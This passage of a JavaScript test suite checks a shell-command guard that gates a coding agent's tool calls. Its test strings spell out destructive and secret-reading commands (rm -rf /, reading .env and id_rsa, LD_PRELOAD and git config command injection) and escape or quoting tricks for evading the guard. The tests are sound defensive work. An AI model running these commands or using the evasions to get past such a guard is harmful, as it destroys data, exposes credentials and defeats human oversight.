// Regression tests for the security review of the shell classifier / guard / hook command (Phase B fix pass).
// Every case here was an ALLOW (or a hang) before the fix: C1 ANSI-C quoting, H1 ReDoS, H2 shell dialects,
// H3 git configuration execution, H4 default-branch push bypasses, H5 protected writes, M1 rm abbreviations and
// find -delete, M2 secret names and globs, M4 inline interpreters and PowerShell dynamics, plus the low items.
// Dangerous command text appears only here, in test source, never on a shell command line.
//
// Forced-platform contexts (identity realpath, no file system) make the cases identical on Windows and POSIX
// hosts; the glob and workspace tests use real temporary directories (realpathSync.native roots).

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test, { after, before } from "node:test";
import { resolveWorkspace } from "../src/commands/hook.mjs";
import { evaluate, shellQuote } from "./guard-fixture.mjs";
import { validateHookEntries } from "../src/runtime/hooks.mjs";
import { loadPolicy, validatePolicy } from "../src/runtime/policy.mjs";
import { MAX_COMMAND_CHARS, tokenize } from "../src/runtime/shell-classify.mjs";
import { classifyShell } from "./guard-fixture.mjs";

const gone = () => {
  throw new Error("ENOENT");
};
const contexts = {
  posix: { platform: "linux", workspaceRoot: "/home/u/work/repo", cwd: "/home/u/work/repo", userDir: "/home/u/.config/asterweave", homedir: () => "/home/u", realpath: (value) => value, readdir: gone },
  win32: { platform: "win32", workspaceRoot: "C:\\work\\repo", cwd: "C:\\work\\repo", userDir: "C:\\Users\\u\\AppData\\Roaming\\asterweave", homedir: () => "C:\\Users\\u", realpath: (value) => value, readdir: gone },
};
const policy = (overrides = {}) => ({
  v: 1,
  mode: "autonomous",
  autonomous: { workflows: ["delivery@1"], repos: ["k"], branches: ["feat/*"], tools: ["shell", "read", "write", "edit", "git"], operations: ["commit", "push-branch", "open-pr"], ...overrides },
});

/** Evaluate a shell command in a forced platform. `mode: "autonomous"` adds the policy. */
function run(command, { on = "posix", mode = "supervised", overrides, ...extra } = {}) {
  const ctx = { mode, env: {}, branchOf: () => "feat/x", remotesOf: () => ["origin"], ...(mode === "autonomous" ? { policy: policy(overrides) } : {}), ...contexts[on], ...extra };
  return evaluate({ type: "tool", tool: { name: "shell", input: { command } } }, ctx);
}
const verdict = (decision) => `${decision.decision}/${decision.reason}`;
const ASK_OR_DENY = ["require-approval", "deny", "unavailable"];

/** In supervised mode the command needs approval or is denied; in autonomous mode it is denied. Never allowed. */
function assertNeverAllowed(command, options = {}) {
  const supervised = run(command, options);
  assert.ok(ASK_OR_DENY.includes(supervised.decision), `supervised: ${command} -> ${verdict(supervised)}`);
  const autonomous = run(command, { ...options, mode: "autonomous" });
  assert.equal(autonomous.decision, "deny", `autonomous: ${command} -> ${verdict(autonomous)}`);
  return supervised;
}

// ---------------------------------------------------------------------------------------------
// C1: $'..' and $".." forms

test("C1: ANSI-C $'..' strings are decoded and checked, and never allowed", () => {
  assert.equal(verdict(run("rm -rf $'/'")), "deny/DESTRUCTIVE_COMMAND");
  assert.equal(verdict(run("rm -rf $'~'")), "deny/DESTRUCTIVE_COMMAND");
  assert.equal(verdict(run("rm -rf $'\\x2f'")), "deny/DESTRUCTIVE_COMMAND");
  assert.equal(verdict(run("rm -rf $'\\57'")), "deny/DESTRUCTIVE_COMMAND", "octal escape");
  assert.equal(verdict(run("cat $'\\x2fetc/passwd'")), "deny/PATH_OUTSIDE_WORKSPACE");
  assert.equal(verdict(run("cat $'\\u002fetc/passwd'")), "deny/PATH_OUTSIDE_WORKSPACE");
  assert.equal(verdict(run("echo x > $'/home/u/.bashrc'")), "deny/PATH_OUTSIDE_WORKSPACE");
  assert.equal(verdict(run("cat $'.en\\x76'")), "deny/SECRET_ACCESS", "the decoded name .env is a secret");
  assert.equal(verdict(run("git $'reset' $'--hard'")), "deny/DESTRUCTIVE_COMMAND");
  // Harmless-looking ANSI-C text still is not understood well enough to allow.
  assertNeverAllowed("echo $'hello\\nworld'");
  assertNeverAllowed("echo $'unterminated");
  assertNeverAllowed("echo $'bad \\cA escape'");
});

test("C1: locale-translated $\"..\" strings are checked like double quotes and never allowed", () => {
  assert.equal(verdict(run('echo > $"/tmp/x"')), "deny/PATH_OUTSIDE_WORKSPACE");
  assert.equal(verdict(run('rm -rf $"/"')), "deny/DESTRUCTIVE_COMMAND");
  assertNeverAllowed('echo $"hello"');
});

test("C1: $ followed by a character that starts an expansion the classifier does not follow is unparseable", () => {
  for (const command of ["echo $1", "echo $@", "echo $?", "echo $$", "echo $#", 'echo "$1"', "echo $[1+1]"]) assertNeverAllowed(command);
  assert.equal(verdict(run("rm -rf $1")), "deny/DESTRUCTIVE_COMMAND", "an unresolved variable as an rm target");
  // A lone $ (end of word, before a space, closing a quote) is literal.
  for (const command of ["echo $", "grep 'a$' src/a.txt", 'grep "a$" src/a.txt', "echo cost$ now"]) assert.equal(run(command).decision, "allow", command);
});

test("C1: the tokenizer decodes ANSI-C escapes and reports them as problems", () => {
  const words = (text) => tokenize(text, { platform: "linux" }).segments.flatMap((segment) => segment.words.map((word) => word.text));
  assert.deepEqual(words("echo $'a\\x41\\n\\t\\\\\\''"), ["echo", "aA\n\t\\'"]);
  assert.deepEqual(words("echo $'\\u00e9\\101'"), ["echo", "\u00e9A"]);
  assert.ok(tokenize("echo $'x'", { platform: "linux" }).problems.includes("ANSI-C quoting $'...'"));
  assert.ok(tokenize('echo $"x"', { platform: "linux" }).problems.some((problem) => problem.includes("locale-translated")));
  assert.ok(tokenize("echo $'\\cA'", { platform: "linux" }).problems.some((problem) => problem.includes("cannot decode")));
});

// ---------------------------------------------------------------------------------------------
// H1: ReDoS and size limits

const timed = (fn) => {
  const start = performance.now();
  const result = fn();
  return [performance.now() - start, result];
};

test("H1: a 1 MB adversarial command is refused fast, in both modes, before any pattern runs", () => {
  for (const unit of ["git push ", "Remove-Item -r -fo ", "rm -rrrrrrrrrrrrrrrr ", "docker system prune "]) {
    const command = unit.repeat(Math.ceil(1_000_000 / unit.length));
    const [ms, decision] = timed(() => run(command));
    assert.ok(ms < 6000, `${unit.trim()}: ${ms} ms`); // measured: ~100 ms; the bound has a wide margin for slow CI, a quadratic pattern would take minutes
    assert.equal(verdict(decision), "deny/UNPARSEABLE_COMMAND", "refused in supervised mode too: nobody can review a command this size");
    assert.equal(decision.ruleId, "command-too-long");
    assert.equal(run(command, { mode: "autonomous" }).decision, "deny");
  }
  assert.equal(MAX_COMMAND_CHARS, 64 * 1024);
});

test("H1: maxCommandChars can lower the cap, never raise it", () => {
  assert.equal(run(`echo ${"a".repeat(95)}`, { maxCommandChars: 100 }).decision, "allow");
  assert.equal(verdict(run(`echo ${"a".repeat(96)}`, { maxCommandChars: 100 })), "deny/UNPARSEABLE_COMMAND");
  assert.equal(verdict(run("a".repeat(MAX_COMMAND_CHARS + 1), { maxCommandChars: 10 * MAX_COMMAND_CHARS })), "deny/UNPARSEABLE_COMMAND");
});

test("H1: commands just under the cap stay fast for every quadratic or cubic floor pattern", () => {
  const family = {
    push: "git push ".repeat(6700),
    removeItem: "Remove-Item -r -fo ".repeat(3100),
    rmFlags: `${"rm -" + "r".repeat(50) + " ".repeat(1)}`.repeat(1100),
    prune: "docker system prune ".repeat(3000),
    quotes: "'a' ".repeat(15000),
    oneWord: "a".repeat(60000),
    deepPath: `cat ${"../".repeat(20000)}`,
    manySegments: "cat x;".repeat(10000),
    manyPaths: `cat ${Array.from({ length: 6000 }, (_, i) => `d${i}/x`).join(" ")}`,
    spaces: `git${" ".repeat(60000)}reset`,
    dots: `Remove-Item ${"-r. ".repeat(14000)}`,
  };
  for (const [name, command] of Object.entries(family)) {
    assert.ok(command.length <= MAX_COMMAND_CHARS, `${name} must fit under the cap (${command.length})`);
    const [ms, decision] = timed(() => run(command));
    assert.ok(ms < 9000, `${name}: ${ms} ms`); // the classifier's own budget is 3 s; this only has to catch a runaway pattern, with 3x margin
    assert.ok(typeof decision.decision === "string", name);
  }
});

test("H1: input made of ALLOWED words, then too many of them, is refused and its cost stays bounded (8k vs 16k words)", () => {
  // `ls` is an understood form; once the command is over the word cap it is refused (hard deny) without being analysed word by word,
  // and the raw-text floor scan is linear: doubling the input must not blow the time up. Generous constants keep this stable.
  const measure = (words) => {
    const command = `ls ${"a ".repeat(words)}`;
    const [ms, decision] = timed(() => run(command));
    assert.equal(verdict(decision), "deny/UNPARSEABLE_COMMAND", `${words} words`);
    assert.equal(decision.ruleId, "command-too-complex");
    return ms;
  };
  // 8k vs 30k words (the 64 KiB cap allows ~32k): linear is about 4x, a quadratic scan would be about 14x. Best of three per size removes scheduler noise.
  const best = (words) => Math.min(measure(words), measure(words), measure(words));
  measure(8000); // warm-up
  const small = Math.max(best(8000), 2);
  const large = best(30000);
  assert.ok(large < small * 9 + 400, `8k words took ${small} ms, 30k words took ${large} ms`);
  // Just under the cap an allowed command is still allowed (the cap is not hiding a general failure).
  assert.equal(run(`ls ${"a ".repeat(300)}`).decision, "allow");
});

test("H1: the per-evaluation time budget refuses a slow classification (command-too-complex, deny)", () => {
  const sleep = () => Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 4);
  const paths = Array.from({ length: 80 }, (_, i) => `/home/u/work/repo/p${i}/x`).join(" ");
  const decision = run(`cat ${paths}`, { realpath: (value) => { sleep(); return value; }, budgetMs: 150 });
  assert.equal(verdict(decision), "deny/UNPARSEABLE_COMMAND");
  assert.equal(decision.ruleId, "command-too-complex");
});

test("H1: the floor still catches every plugin pattern on long lines (parity of the linear scan)", () => {
  const filler = "echo ok && ".repeat(200);
  const hits = ["git reset --hard", "git clean -fd", "git checkout .", "git push --force", "rm -rf /", "Remove-Item -Recurse -Force C:\\", "DROP DATABASE x", "docker system prune -a", "kubectl delete ns x", "terraform destroy"];
  for (const command of hits) assert.equal(verdict(run(filler + command)), "deny/DESTRUCTIVE_COMMAND", command);
});

// ---------------------------------------------------------------------------------------------
// H2: the shell dialect follows the tool, not the host

test("H2: Bash on a Windows host is a POSIX shell: backslash-escaped letters are removed before the checks", () => {
  for (const on of ["win32", "posix"]) {
    const dialect = { on, dialect: "posix" };
    assert.equal(verdict(run("git re\\set --hard", dialect)), "deny/DESTRUCTIVE_COMMAND", on);
    assert.equal(verdict(run("g\\it reset --hard", dialect)), "deny/DESTRUCTIVE_COMMAND", on);
    assert.equal(verdict(run("git push origin ma\\in", dialect)), "require-approval/DEFAULT_BRANCH_PUSH", on);
    assert.equal(verdict(run("g\\it push origin main", dialect)), "require-approval/DEFAULT_BRANCH_PUSH", on);
    assert.equal(verdict(run("git push origin \"ma\"\"in\"", dialect)), "require-approval/DEFAULT_BRANCH_PUSH", on);
  }
});

test("H2: a Windows host with no dialect given checks the POSIX reading too (findings are merged)", () => {
  assert.equal(verdict(run("git re\\set --hard", { on: "win32" })), "deny/DESTRUCTIVE_COMMAND");
  // The cmd reading (backslash literal) of `ma\in` is unparseable and the POSIX reading is the default branch: both findings exist.
  const pushed = run("git push origin ma\\in", { on: "win32" });
  assert.ok(ASK_OR_DENY.includes(pushed.decision), verdict(pushed));
  assert.ok(pushed.detail.findings.some((finding) => finding.code === "DEFAULT_BRANCH_PUSH"), JSON.stringify(pushed.detail.findings));
});

test("H2: the floor runs on the de-escaped word stream, not only on the raw text", () => {
  const result = classifyShell("g\\it re\\set --ha\\rd", { ...contexts.posix, dialect: "posix" });
  assert.ok(result.findings.some((finding) => finding.ruleId === "git-reset-hard"));
  assert.ok(result.findings.every((finding) => finding.code === "DESTRUCTIVE_COMMAND" || finding.ruleId === "not-allow-listed"), "the floor plus the allow-list miss, nothing else");
});

test("H2: PowerShell escapes with a backtick, not a backslash; cmd with a caret", () => {
  assert.equal(verdict(run("git re`set --hard", { on: "win32", dialect: "powershell" })), "deny/DESTRUCTIVE_COMMAND");
  assert.equal(verdict(run("git push origin ma`in", { on: "win32", dialect: "powershell" })), "require-approval/DEFAULT_BRANCH_PUSH");
  assert.equal(verdict(run("g`it push origin main", { on: "win32", dialect: "powershell" })), "require-approval/DEFAULT_BRANCH_PUSH");
  assert.equal(run("git push origin 'fe''at'", { on: "win32", dialect: "powershell" }).reason, "UNPARSEABLE_COMMAND", "'fe''at' is the branch fe'at, a name the guard does not model");
  assert.equal(run("git push origin 'feat'", { on: "win32", dialect: "powershell" }).decision, "allow");
  assert.equal(verdict(run("g^it push origin main", { on: "win32", dialect: "cmd" })), "require-approval/DEFAULT_BRANCH_PUSH");
  assert.equal(verdict(run("git push origin ma^in", { on: "win32", dialect: "cmd" })), "require-approval/DEFAULT_BRANCH_PUSH");
  const powershell = tokenize("echo C:\\a\\b `$x", { platform: "win32", dialect: "powershell" });
  assert.deepEqual(powershell.segments[0].words.map((word) => word.text), ["echo", "C:\\a\\b", "$x"], "backslashes are literal in PowerShell");
  assert.throws(() => classifyShell("ls", { ...contexts.posix, dialect: "fish" }), /dialect/);
});

// ---------------------------------------------------------------------------------------------
// H3: git configuration that executes commands

test("H3: --config-env, GIT_* assignments, risky environment prefixes and -c outside the allow-list are unparseable", () => {
  const commands = [
    "FOO='!rm -rf ~/' git --config-env=alias.x=FOO x",
    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0='!rm -rf ~/' git x",
    "GIT_EXTERNAL_DIFF='cmd' git diff",
    "GIT_SSH_COMMAND=cmd git fetch",
    "GIT_PAGER=cmd git log",
    "LD_PRELOAD=/tmp/x.so ls",
    "BASH_ENV=/tmp/x ls",
    "ENV=/tmp/x ls",
    "PAGER=cmd git log",
    "EDITOR=cmd git commit",
    "VISUAL=cmd ls",
    "PATH=/tmp ls",
    "NODE_OPTIONS=--require=/tmp/x.js node a.js",
    "env GIT_ASKPASS=cmd git fetch",
    "env PAGER=cmd git log",
    "export GIT_CONFIG_PARAMETERS=x",
    "git -c pager.log=cmd log",
    "git -c core.pager=cmd log",
    "git -c gpg.ssh.program=cmd log",
    "git -c core.sshCommand=cmd fetch",
    "git -c alias.x='!cmd' x",
    "git -c credential.helper=cmd fetch",
    "git -c k=v status",
    "git -c",
    "git --config-env alias.x=FOO x",
    "git --exec-path=/tmp/x status",
    "git --exec-path status",
    "git push --receive-pack=cmd /tmp/bare feat",
    "git push --exec=cmd /tmp/bare feat",
    "git fetch --upload-pack=cmd /tmp/bare",
  ];
  for (const command of commands) assertNeverAllowed(command);
});

test("H3: harmless git configuration and ordinary variables stay allowed", () => {
  assert.equal(run("git config --get user.name").decision, "allow");
  // CHANGED (was allow): a remote URL can embed credentials, so reading *.url / *.pushurl asks (see guard-allowlist-review.test.mjs).
  assert.equal(verdict(run("git config --get remote.origin.url")), "require-approval/UNPARSEABLE_COMMAND");
  // Not understood forms any more (global -c, variable prefixes, config writes): they ask, but are never judged to run commands or write protected configuration.
  for (const command of ["git -c user.name=x -c color.ui=never status", "git -c core.quotepath=false diff", "GIT_AUTHOR_NAME=x git commit -m msg", "FOO=1 ls", "CI=1 npm test", "git config user.name", "git config --list", "git config user.name x"]) {
    const decision = run(command);
    assert.equal(verdict(decision), "require-approval/UNPARSEABLE_COMMAND", command);
    assert.ok(!decision.detail.findings.some((finding) => ["git-config-exec", "env-assignment", "git-config-write"].includes(finding.ruleId)), command);
  }
});

test("H3: git config writes of keys that run commands, redirect remotes or change pushes are refused", () => {
  for (const command of ["git config alias.x '!cmd'", "git config core.hooksPath /tmp/h", "git config remote.origin.push refs/heads/feat:refs/heads/main", "git config push.default matching", "git config --global user.name x", "git config --system core.pager cmd", "git config --edit", "git config --unset alias.x", "git config --file /tmp/c user.name x"]) {
    assert.equal(verdict(run(command)), "deny/PROTECTED_PATH", command);
  }
});

// ---------------------------------------------------------------------------------------------
// H4: default-branch push bypasses

test("H4: refspecs git resolves in ways the classifier does not model are unparseable", () => {
  const commands = [
    "git push origin feat:heads/main",
    "git push origin feat:refs/remotes/origin/main",
    "git push origin HEAD:refs/for/main",
    "git push origin feat:tags/x",
    "git -c remote.origin.push=refs/heads/feat:refs/heads/main push",
    "git -c push.default=upstream push",
    "git -c push.default=matching push",
    "git -c branch.feat.pushRemote=origin push",
    "B=main; git push origin $B",
    "git push origin $B",
    "git push origin ${B}",
    "git push origin m$'a'in",
    "git push origin {main,x}",
    "git push origin {a..b}",
    "git push origin feat@{1}:main",
    "git push origin feat:main:main",
    "git push origin 'a b'",
    "git push origin feat^:main",
    "git push origin ~1:feat",
  ];
  for (const command of commands) assertNeverAllowed(command);
  // Understood forms keep working.
  for (const command of ["git push origin feat", "git push -u origin feat/x"]) assert.equal(run(command).decision, "allow", command);
  for (const command of ["git push origin feat:refs/heads/feat", "git push origin refs/tags/v1", "git push origin feat:feat"]) {
    const decision = run(command); // asks now (not an understood form), but is not a default-branch push
    assert.equal(verdict(decision), "require-approval/UNPARSEABLE_COMMAND", command);
    assert.ok(!decision.detail.findings.some((finding) => finding.code === "DEFAULT_BRANCH_PUSH"), command);
  }
  assert.equal(verdict(run("git push origin feat:refs/heads/main")), "require-approval/DEFAULT_BRANCH_PUSH");
  assert.equal(verdict(run("git push origin feat:MAIN")), "require-approval/DEFAULT_BRANCH_PUSH");
});

test("H4: autonomous push-branch needs a non-empty branches list in the policy; the validator rejects a policy without one", () => {
  const withoutList = run("git push origin feat/x", { mode: "autonomous", overrides: { branches: undefined } });
  assert.equal(verdict(withoutList), "deny/OUT_OF_POLICY_OPERATION");
  assert.equal(withoutList.ruleId, "push-branch-requires-branches");
  assert.equal(run("git push origin feat/x", { mode: "autonomous", overrides: { branches: [] } }).decision, "deny");
  assert.equal(run("git push origin feat/x", { mode: "autonomous" }).decision, "allow");
  assert.equal(verdict(run("git push origin fix/x", { mode: "autonomous" })), "require-approval/OUT_OF_POLICY_OPERATION", "outside the listed globs");
  // The validator.
  const raw = policy({ branches: undefined });
  delete raw.autonomous.branches;
  assert.ok(validatePolicy(raw).some((issue) => issue.includes("autonomous.branches is required")));
  assert.ok(validatePolicy(policy({ branches: [] })).some((issue) => issue.includes("autonomous.branches is required")));
  assert.deepEqual(validatePolicy(policy()), []);
  const noPush = policy({ operations: ["commit"] });
  delete noPush.autonomous.branches;
  assert.deepEqual(validatePolicy(noPush), [], "branches are optional when push-branch is not listed");
});

// ---------------------------------------------------------------------------------------------
// H5: protected writes

test("H5: shell writes to .git, .claude settings and hooks, and .mcp.json are denied (PROTECTED_PATH)", () => {
  const commands = [
    "echo x > .git/config", "echo x >> .git/hooks/pre-commit", "tee .git/hooks/pre-commit", "echo x > .claude/settings.json", "echo x > .claude/settings.local.json",
    "echo x > .claude/asterweave.json", "echo x > .claude/hooks/guard.mjs", "echo x > .mcp.json", "cp a .git/config", "mv a .mcp.json", "rm .git/index", "rm -rf .git", "rm -rf .claude",
    "rm -rf .claude/hooks", "mv .claude .claude-off", "sed -i s/a/b/ .git/config", "sed -i -e s/a/b/ .claude/settings.json", "echo x > sub/.git/config", "touch .git/hooks/post-commit",
    "dd if=/dev/null of=.git/config", "find .git -delete", "ln -s a .git/hooks/pre-commit", "chmod +x .git/hooks/pre-commit",
  ];
  for (const command of commands) assert.equal(verdict(run(command)), "deny/PROTECTED_PATH", command);
  for (const command of ["echo x > .git/config", "rm -rf .git"]) assert.equal(run(command, { mode: "autonomous" }).decision, "deny");
});

test("H5: reads and unrelated writes are untouched; creating .claude is fine", () => {
  // CHANGED: "cat .git/config" moved out of this list (reading it asks: remote URLs can embed credentials).
  for (const command of ["cat .claude/settings.json", "ls .git", "git status", "cat .mcp.json", "git log"]) {
    assert.equal(run(command).decision, "allow", command);
  }
  // Writes are never an understood form (they ask), and unrelated ones are not judged protected.
  for (const command of ["echo x > .gitignore", "echo x > notes.md", "mkdir .claude", "echo x > .claude/commands/a.md"]) {
    assert.equal(verdict(run(command)), "require-approval/UNPARSEABLE_COMMAND", command);
  }
});

test("H5: the Windows spellings of .git are protected too (case, trailing dot or space, NTFS stream, 8.3 name)", () => {
  for (const command of ["echo x > .GIT\\config", "echo x > .git.\\config", "echo x > \".git \\config\"", "echo x > GIT~1\\config", "echo x > .CLAUDE\\settings.json", "echo x > .claude\\Settings.json", "echo x > .MCP.JSON"]) {
    assert.equal(verdict(run(command, { on: "win32", dialect: "cmd" })), "deny/PROTECTED_PATH", command);
  }
});

test("H5: an NTFS stream spelling of .git (contains a $) is never allowed", () => {
  const decision = run("echo x > .git::$INDEX_ALLOCATION\\config", { on: "win32", dialect: "cmd" });
  assert.ok(ASK_OR_DENY.includes(decision.decision), verdict(decision));
  assert.equal(run("echo x > .git::$INDEX_ALLOCATION\\config", { on: "win32", dialect: "cmd", mode: "autonomous" }).decision, "deny");
});

test("H5: the write, edit and read tools use the same rules", () => {
  const tool = (name, path) => evaluate({ type: "tool", tool: { name, input: { path } } }, { mode: "supervised", env: {}, ...contexts.posix });
  for (const name of ["write", "edit"]) {
    for (const file of [".git/config", ".git/hooks/pre-commit", ".claude/settings.json", ".claude/settings.local.json", ".claude/asterweave.json", ".claude/hooks/a.mjs", ".mcp.json"]) {
      assert.equal(verdict(tool(name, file)), "deny/PROTECTED_PATH", `${name} ${file}`);
    }
    assert.equal(tool(name, "src/a.txt").decision, "allow");
  }
  assert.equal(tool("read", ".git/config").decision, "require-approval", "CHANGED (was allow): .git/config can hold credentials in remote URLs");
});

// ---------------------------------------------------------------------------------------------
// H6: workspace root

let base;
let home;
before(() => {
  base = realpathSync.native(mkdtempSync(join(tmpdir(), "aw-hard-")));
  home = join(base, "home");
  mkdirSync(home, { recursive: true });
});
after(() => rmSync(base, { recursive: true, force: true, maxRetries: 5, retryDelay: 50 }));

function gitInit(directory) {
  mkdirSync(directory, { recursive: true });
  const result = spawnSync("git", ["init", "-q"], { cwd: directory, encoding: "utf8" });
  assert.equal(result.status, 0, result.stderr);
}

test("H6: CLAUDE_PROJECT_DIR wins; payload.cwd is only the working directory", () => {
  const project = join(base, "project");
  mkdirSync(join(project, "sub"), { recursive: true });
  const found = resolveWorkspace({ payloadCwd: join(project, "sub"), processCwd: base, env: { CLAUDE_PROJECT_DIR: project }, homedir: () => home });
  assert.deepEqual(found, { root: project, cwd: join(project, "sub") });
  // A cwd outside the project does not move the root.
  assert.equal(resolveWorkspace({ payloadCwd: home, processCwd: base, env: { CLAUDE_PROJECT_DIR: project }, homedir: () => home }).root, project);
  assert.match(resolveWorkspace({ payloadCwd: project, env: { CLAUDE_PROJECT_DIR: "relative" }, homedir: () => home }).error, /absolute/);
  assert.match(resolveWorkspace({ payloadCwd: project, env: { CLAUDE_PROJECT_DIR: join(base, "missing") }, homedir: () => home }).error, /does not exist/);
  assert.match(resolveWorkspace({ payloadCwd: join(base, "missing"), env: { CLAUDE_PROJECT_DIR: project }, homedir: () => home }).error, /does not exist/);
});

test("H6: otherwise the git top level of the cwd, with the hostile cases rejected", () => {
  const repo = join(base, "repo");
  gitInit(repo);
  mkdirSync(join(repo, "pkg", "deep"), { recursive: true });
  const found = resolveWorkspace({ payloadCwd: join(repo, "pkg", "deep"), env: {}, homedir: () => home });
  assert.deepEqual(found, { root: repo, cwd: join(repo, "pkg", "deep") });
  // Not a repository: the root cannot be determined.
  const plain = join(base, "plain");
  mkdirSync(plain, { recursive: true });
  assert.match(resolveWorkspace({ payloadCwd: plain, env: {}, homedir: () => home }).error, /cannot be determined/);
  // A repository at the home directory (a dotfiles repo) is too broad to be a workspace.
  const dotfiles = join(base, "dotfiles-home");
  gitInit(dotfiles);
  mkdirSync(join(dotfiles, "work"), { recursive: true });
  assert.match(resolveWorkspace({ payloadCwd: join(dotfiles, "work"), env: {}, homedir: () => dotfiles }).error, /too broad/);
  // ... and so is a top level that is an ancestor of the home directory.
  assert.match(resolveWorkspace({ payloadCwd: join(repo, "pkg"), env: {}, homedir: () => join(repo, "pkg") }).error, /too broad/);
  // A hostile core.worktree that points at a directory with no .git entry is refused.
  const hostile = join(base, "hostile");
  gitInit(hostile);
  const worktree = join(base, "elsewhere");
  mkdirSync(join(worktree, "inner"), { recursive: true });
  const set = spawnSync("git", ["config", "core.worktree", worktree], { cwd: hostile, encoding: "utf8" });
  assert.equal(set.status, 0, set.stderr);
  const refused = resolveWorkspace({ payloadCwd: join(worktree, "inner"), env: {}, homedir: () => home });
  assert.ok(refused.error, JSON.stringify(refused));
});

// ---------------------------------------------------------------------------------------------
// M1: rm abbreviations, find, .git

test("M1: GNU long-option abbreviations of --recursive and --force are recognised", () => {
  for (const command of ["rm --recur --forc *", "rm --recu --forc /home/u/work/repo", "rm --r --f /home/u/work", "rm --recursive --f /etc", "rm --rec --for /home/u/work/repo", "rm --recurs -f /home/u"]) {
    assert.equal(verdict(run(command)), "deny/DESTRUCTIVE_COMMAND", command);
  }
  assert.equal(verdict(run("rm --recursive --force build")), "require-approval/UNPARSEABLE_COMMAND", "a strict subpath of the workspace is not destructive, but not an understood form either");
  assert.equal(verdict(run("rm --verbose build/a.txt")), "require-approval/UNPARSEABLE_COMMAND");
});

test("M1: find -delete and find -exec over the workspace root or outside it", () => {
  for (const command of ["find . -delete", "find -delete", "find . -exec rm -rf {} +", "find . -type f -delete", "find / -delete", "find /home/u -name x -delete", "find .. -name x -exec rm {} ;", "find $X -delete", "find ~ -exec rm {} +"]) {
    assert.equal(verdict(run(command)), "deny/DESTRUCTIVE_COMMAND", command);
  }
  for (const command of ["find build -delete", "find . -name '*.pyc' -delete", "find src -name '*.tmp' -exec rm {} +", "find . -name '*.o' -exec ls {} +", "find . -type f"]) {
    assert.equal(verdict(run(command)), "require-approval/UNPARSEABLE_COMMAND", command); // find is not in the allow-list; the floors above still deny the broad forms
  }
});

// ---------------------------------------------------------------------------------------------
// M2: secret names (Windows spellings, globs)

test("M2: on Windows trailing dots, spaces and NTFS streams do not hide a secret name", () => {
  for (const command of ["type .env.", "type \".env \"", "type id_rsa.", "type server.pem.", "type .env::$DATA", "type C:\\Users\\u\\.aws\\credentials:x", "type .ssh.\\id_rsa", "type .ENV", "type .env. .", "type ID_RSA"]) {
    assert.equal(verdict(run(command, { on: "win32", dialect: "cmd" })), "deny/SECRET_ACCESS", command);
  }
  assert.equal(run("type notes.txt.", { on: "win32", dialect: "cmd" }).decision, "allow");
  assert.equal(run("type .env.example", { on: "win32", dialect: "cmd" }).decision, "allow", "templates are not secrets");
});

test("M2: a wildcard that can match a secret name is refused (both platforms, no file system needed)", () => {
  for (const on of ["posix", "win32"]) {
    for (const command of ["cat .en*", "cat .e?v", "cat .env*", "cat id_r*", "cat id_rs?", "cat *.pem", "cat *.key", "cat ~/.ss*/id_rsa", "cat .e[a-z]v", "cat src/*.pem", "cat cred*"]) {
      assert.equal(verdict(run(command, { on, dialect: on === "win32" ? "cmd" : "posix" })), "deny/SECRET_ACCESS", `${on}: ${command}`);
    }
    for (const command of ["cat *", "cat *.md", "cat src/*.js", "rm -rf dist/*", "cat ?", "cat *.log", "ls *.txt"]) {
      assert.notEqual(run(command, { on, dialect: on === "win32" ? "cmd" : "posix" }).reason, "SECRET_ACCESS", `${on}: ${command}`);
    }
  }
});

test("M2: with a real directory the wildcard is matched against what is there", () => {
  const dir = join(base, "globs");
  mkdirSync(join(dir, "src"), { recursive: true });
  writeFileSync(join(dir, ".env"), "SECRET=1\n");
  writeFileSync(join(dir, "src", "id_rsa"), "k\n");
  writeFileSync(join(dir, "readme.md"), "r\n");
  const ctx = { mode: "supervised", env: {}, workspaceRoot: dir, cwd: dir, userDir: join(base, "ud"), homedir: () => home, branchOf: () => "feat/x", remotesOf: () => ["origin"] };
  const shell = (command) => evaluate({ type: "tool", tool: { name: "shell", input: { command } } }, ctx);
  assert.equal(verdict(shell("cat .e*")), "deny/SECRET_ACCESS");
  assert.equal(verdict(shell("cat src/id_*")), "deny/SECRET_ACCESS");
  assert.equal(verdict(shell("cat src/*")), "deny/SECRET_ACCESS", "a bare * is matched against the real listing too (id_rsa is there)");
  assert.equal(shell("cat readme.m*").decision, "allow");
  assert.equal(shell("cat .x*").decision, "allow", "no such file, so nothing matches");
  assert.equal(shell("cat read*").decision, "allow");
});

// ---------------------------------------------------------------------------------------------
// M4: inline interpreters and PowerShell dynamics

test("M4: interpreters that run code from the command line are unparseable", () => {
  for (const command of [
    "node -e \"1\"", "node --eval 1", "node -p 1", "node -pe 1", "node -r ts-node/register -e 1", "python -c 'x'", "python3 -c x", "python3.11 -c x", "py -3 -c x", "perl -e 1", "perl -le 1", "perl -E 1", "ruby -e 1",
    "php -r 1", "deno eval 1", "bun -e 1", "node -", "python -", "lua -e 1", "Rscript -e 1", "bash -c ls", "sh -c ls", "osascript -e x", "julia -e 1",
  ]) assertNeverAllowed(command);
  // Interpreters and build tools are never understood (they ask); only an inline-code flag is reported as such.
  for (const command of ["node --test", "node bin/a.mjs --eval", "node script.js -e x", "python -m pytest -c conf.ini", "python script.py", "perl script.pl -e", "npm test", "node --version", "deno run a.ts"]) {
    const decision = run(command);
    assert.equal(verdict(decision), "require-approval/UNPARSEABLE_COMMAND", command);
    assert.ok(!decision.detail.findings.some((finding) => finding.ruleId === "inline-interpreter"), command);
  }
});

test("M4: PowerShell Start-Process, the call operator with a non-literal, Invoke-Expression and static member calls are unparseable", () => {
  const ps = { on: "win32", dialect: "powershell" };
  for (const command of [
    "Start-Process git -ArgumentList push", "saps git", "start git", "& $x push origin main", "& (Get-Command git) push", "& { git push origin main }", "& ('gi'+'t') push", "Invoke-Expression $c", "iex $c",
    "[System.Net.WebClient]::new()", "[Environment]::Exit(0)", "Invoke-Command { ls }", "icm { ls }", "New-Object System.Diagnostics.Process", "wsl ls", "$(Get-Date)", "\"a $(1)\"",
  ]) {
    const supervised = run(command, ps);
    assert.ok(ASK_OR_DENY.includes(supervised.decision), `supervised: ${command} -> ${verdict(supervised)}`);
    assert.equal(run(command, { ...ps, mode: "autonomous" }).decision, "deny", `autonomous: ${command}`);
